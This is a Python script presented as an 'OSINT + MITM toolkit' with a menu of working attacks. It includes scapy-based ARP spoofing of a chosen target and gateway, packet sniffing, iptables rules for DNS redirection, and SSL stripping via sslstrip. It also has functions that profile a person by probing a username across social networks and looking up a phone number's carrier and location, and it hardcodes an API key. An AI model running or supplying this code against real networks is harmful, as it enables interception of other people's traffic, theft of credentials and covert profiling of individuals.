#!/usr/bin/env python3

import os
import sys
import re
import requests
import signal
from time import sleep
from termcolor import cprint, colored
from scapy.all import ARP, Ether, srp, send, sniff

# ====== CONFIG ======
NUMVERIFY_API_KEY = "1c7d82898e098458113d8c05a9c8a8d8"
PROXY = {"http": None, "https": None}  # Can be updated by user

# ====== CLI UTIL ======
def clear(): os.system('cls' if os.name == 'nt' else 'clear')
def banner():
    clear()
    cprint(r"""
   █████████  █████ █████ ███████████  ██████████ ███████████        █████████  █████   █████    ███████     █████████  ███████████  █████████    
  ███░░░░░███░░███ ░░███ ░░███░░░░░███░░███░░░░░█░░███░░░░░███      ███░░░░░███░░███   ░░███   ███░░░░░███  ███░░░░░███░█░░░███░░░█ ███░░░░░███   
 ███     ░░░  ░░███ ███   ░███    ░███ ░███  █ ░  ░███    ░███     ███     ░░░  ░███    ░███  ███     ░░███░███    ░░░ ░   ░███  ░ ░███    ░░░    
░███           ░░█████    ░██████████  ░██████    ░██████████     ░███          ░███████████ ░███      ░███░░█████████     ░███    ░░█████████    
░███            ░░███     ░███░░░░░███ ░███░░█    ░███░░░░░███    ░███    █████ ░███░░░░░███ ░███      ░███ ░░░░░░░░███    ░███     ░░░░░░░░███   
░░███     ███    ░███     ░███    ░███ ░███ ░   █ ░███    ░███    ░░███  ░░███  ░███    ░███ ░░███     ███  ███    ░███    ░███     ███    ░███   
 ░░█████████     █████    ███████████  ██████████ █████   █████    ░░█████████  █████   █████ ░░░███████░  ░░█████████     █████   ░░█████████    
  ░░░░░░░░░     ░░░░░    ░░░░░░░░░░░  ░░░░░░░░░░ ░░░░░   ░░░░░      ░░░░░░░░░  ░░░░░   ░░░░░    ░░░░░░░     ░░░░░░░░░     ░░░░░     ░░░░░░░░░     

          CYBER GHOSTS | OSINT + MITM TOOLKIT
""", "cyan")


def signal_handler(sig, frame):
    print(colored("\n[!] Exit triggered. Goodbye!", "red"))
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ====== OSINT ======
def osint_username_lookup():
    user = input("[+] Enter username: ").strip()
    platforms = {
        "Instagram": f"https://instagram.com/{user}",
        "GitHub": f"https://github.com/{user}",
        "Reddit": f"https://www.reddit.com/user/{user}",
        "Twitter": f"https://twitter.com/{user}",
        "Facebook": f"https://facebook.com/{user}",
        "Snapchat": f"https://www.snapchat.com/add/{user}",
        "Telegram": f"https://t.me/{user}",
        "TikTok": f"https://www.tiktok.com/@{user}",
    }
    for name, url in platforms.items():
        try:
            r = requests.get(url, proxies=PROXY, timeout=5)
            if r.status_code == 200:
                cprint(f"[+] Found on {name}: {url}", "green")
            else:
                cprint(f"[-] Not found on {name}", "red")
        except:
            cprint(f"[!] Error checking {name}", "yellow")

def phone_lookup():
    phone = input("[+] Enter phone number (+countrycode): ").strip()
    try:
        url = f"http://apilayer.net/api/validate?access_key={NUMVERIFY_API_KEY}&number={phone}&format=1"
        r = requests.get(url, proxies=PROXY)
        data = r.json()
        if data.get("valid"):
            cprint(f"[\u2713] Number: {data['international_format']}", "green")
            cprint(f"[\u2713] Country: {data['country_name']}", "green")
            cprint(f"[\u2713] Location: {data['location']}", "green")
            cprint(f"[\u2713] Carrier: {data['carrier']}", "green")
            cprint(f"[\u2713] Line Type: {data['line_type']}", "green")
        else:
            cprint("[!] Invalid number.", "red")
    except Exception as e:
        cprint(f"[!] API error: {e}", "red")

# ====== MITM ======
def get_mac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=2, verbose=0)
    return ans[0][1].hwsrc if ans else None

def spoof(target_ip, spoof_ip):
    mac = get_mac(target_ip)
    if not mac:
        cprint("[!] MAC not found", "red"); return
    pkt = ARP(op=2, pdst=target_ip, hwdst=mac, psrc=spoof_ip)
    send(pkt, verbose=0)

def restore(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    send(pkt, count=4, verbose=0)

def arp_spoof():
    target = input("Target IP: ")
    gateway = input("Gateway IP: ")
    try:
        while True:
            spoof(target, gateway)
            spoof(gateway, target)
            sleep(2)
    except KeyboardInterrupt:
        restore(target, gateway)
        restore(gateway, target)
        cprint("[\u2713] ARP tables restored.", "green")

def sniff_packets():
    iface = input("Interface (e.g. wlan0): ")
    sniff(iface=iface, prn=lambda x: x.summary(), store=0)

def dns_spoof():
    cprint("[*] DNS spoofing via ettercap/iptables suggested.", "yellow")
    os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
    os.system("echo 'Use ettercap or DNSChef to respond with spoofed IPs.'")
    input("[Enter to continue]")

def ssl_strip():
    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
    os.system("sslstrip -l 10000")

# ====== IP SCANNER ======
def ip_scanner():
    import socket
    target = input("Target domain/IP: ").strip()
    try:
        ip = socket.gethostbyname(target)
        cprint(f"[+] IP Address: {ip}", "cyan")
    except Exception as e:
        cprint(f"[!] DNS resolution error: {e}", "red")

# ====== MENUS ======
def osint_menu():
    while True:
        banner()
        cprint("[1] Username Lookup", "blue")
        cprint("[2] Phone Number Lookup", "blue")
        cprint("[3] IP Scanner", "blue")
        cprint("[0] Back", "blue")
        choice = input("[?] Choose: ")
        if choice == "1": osint_username_lookup(); input("\nPress Enter...")
        elif choice == "2": phone_lookup(); input("\nPress Enter...")
        elif choice == "3": ip_scanner(); input("\nPress Enter...")
        elif choice == "0": return

def mitm_menu():
    while True:
        banner()
        cprint("[1] ARP Spoofing", "blue")
        cprint("[2] Packet Sniffing", "blue")
        cprint("[3] DNS Spoofing", "blue")
        cprint("[4] SSL Strip", "blue")
        cprint("[0] Back", "blue")
        choice = input("[?] Choose: ")
        if choice == "1": arp_spoof()
        elif choice == "2": sniff_packets(); input("\nPress Enter...")
        elif choice == "3": dns_spoof()
        elif choice == "4": ssl_strip()
        elif choice == "0": return

# ====== MAIN ======
def main():
    if os.geteuid() != 0:
        cprint("[!] Run this tool as root/admin!", "red")
        sys.exit(1)
    while True:
        banner()
        cprint("[1] OSINT Toolkit", "cyan")
        cprint("[2] MITM Toolkit", "cyan")
        cprint("[0] Exit", "cyan")
        choice = input("[?] Choose: ")
        if choice == "1": osint_menu()
        elif choice == "2": mitm_menu()
        elif choice == "0": break

if __name__ == "__main__":
    main()
